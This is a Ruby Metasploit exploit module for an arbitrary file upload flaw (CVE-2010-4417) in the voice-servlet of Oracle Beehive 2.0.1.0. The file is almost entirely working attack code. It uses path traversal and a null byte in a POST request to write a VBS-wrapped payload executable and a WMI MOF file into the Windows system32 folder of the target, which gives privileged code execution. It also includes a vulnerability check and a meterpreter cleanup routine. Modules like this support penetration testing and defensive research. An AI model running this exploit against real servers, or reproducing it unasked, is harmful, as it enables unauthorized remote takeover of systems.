##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Oracle-Application-Server-10g/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Oracle Beehive voice-servlet Arbitrary File Upload',
			'Description' => %q{
					This module exploits an arbitrary file upload flaw in Oracle Beehive. The
				problem exists in the Include.jspf component in the voice-servlet application. The
				module has been tested successfully on Oracle Beehive 2.0.1.0 over Windows 2003
				SP2, where the Windows Management Instrumentation service has been used to achieve
				arbitrary code execution.
			},
			'Author'       =>
				[
					'1c239c43f521145fa8385d64a9c32243', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2010-4417' ],
					[ 'OSVDB', '70552' ],
					[ 'BID', '45854' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-020/' ],
					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html' ]
				],

			'DefaultOptions' =>
				{
					'WfsDelay' => 20
				},
			'Platform'       => 'win',
			'Privileged'  => true,
			'Targets'     =>
				[
					[ 'Oracle Beehive 2.0.1.0 / Windows 2003 SP2',
						{},
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 18 2011'))

		register_options(
			[
				Opt::RPORT(7777),
				OptInt.new('DEPTH', [true, 'Traversal depth to reach the root', 12])
			], self.class)
	end

	def on_new_session(client)

		return if not @var_mof_name
		return if not @var_vbs_name

		if client.type != "meterpreter"
			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
			print_error("The exe payload (C:\\windows\\system32\\#{@var_vbs_name}.vbs) and mof file (C:\\windows\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof) must be removed manually.")
			return
		end

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		cmd = "C:\\windows\\system32\\attrib.exe -r " +
			"C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"

		client.sys.process.execute(cmd, nil, {'Hidden' => true })

		begin
			print_warning("Deleting the exe payload \"#{@var_vbs_name}.vbs\" ...")
			client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
			print_error("The exe payload (C:\\windows\\system32\\#{@var_vbs_name}.vbs) must be removed manually.")
		end

		begin
			print_warning("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
			client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
			print_error("The mof file (C:\\windows\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof) must be removed manually.")
		end

	end

	def upload_file(session, path, contents)
		post_data = "sess=#{session}&"
		post_data << "recxml=#{path}%00&"
		post_data << "wavfile=#{rand_text_alpha(rand(5)+5)}&"
		post_data << "prevwavfile=#{rand_text_alpha(rand(5)+5)}&"
		post_data << "audiopath=#{rand_text_alpha(rand(5)+5)}&"
		post_data << "evaluation=#{Rex::Text.uri_encode(contents)}"

		res = send_request_cgi(
			{
				'uri'    => "/voice-servlet/prompt-qa/indexRecxml.jsp",
				'method' => 'POST',
				'data'   => post_data,
			})
		return res
	end

	def check

		file_name = rand_text_alpha(rand(5)+5)
		file_contents = rand_text_alpha(rand(20)+20)
		session = rand_text_alpha(rand(5)+5)

		print_status("Uploading the #{file_name}.txt file")

		res = upload_file(session, "#{file_name}.txt", file_contents)

		if not res or res.code != 200 or res.body !~ /RECXML Prompt Tester/ or res.body !~ /#{session}/
			print_error("The test file could not be uploaded")
			return Exploit::CheckCode::Safe
		end

		print_status("Checking uploaded contents...")

		res = send_request_cgi(
			{
				'uri'     => "/voice-servlet/prompt-qa/results/#{file_name}.txt",
				'method'  => 'GET'
			})

		if res and res.code == 200 and res.body =~ /#{file_contents}/
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe

	end


	def exploit

		@var_mof_name = rand_text_alpha(rand(5)+5)
		@var_vbs_name = rand_text_alpha(rand(5)+5)
		session = rand_text_alpha(rand(5)+5)

		print_status("Encoding payload into exe...")

		exe = generate_payload_exe
		vbs = Msf::Util::EXE.to_exe_vbs(exe)

		print_status("Generating mof file...")
		mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

		traversal = "..\\" * datastore['DEPTH']

		print_status("Uploading the payload to c:\\WINDOWS\\system32\\#{@var_vbs_name}.vbs...")

		res = upload_file(session, "#{traversal}\\WINDOWS\\system32\\#{@var_vbs_name}.vbs", vbs)

		if res and res.code == 200 and res.body =~ /RECXML Prompt Tester/ and res.body =~ /#{session}/
			print_good("Payload successfully uploaded")
		else
			print_error("Error uploading the Payload")
			return
		end

		print_status("Uploading the MOF file to c:\\WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof...")

		res = upload_file(session, "#{traversal}WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof", mof_content)

		if res and res.code == 200 and res.body =~ /RECXML Prompt Tester/ and res.body =~ /#{session}/
			print_good("MOF file successfully uploaded")
		else
			print_error("Error uploading the MOF file")
			return
		end

	end


end
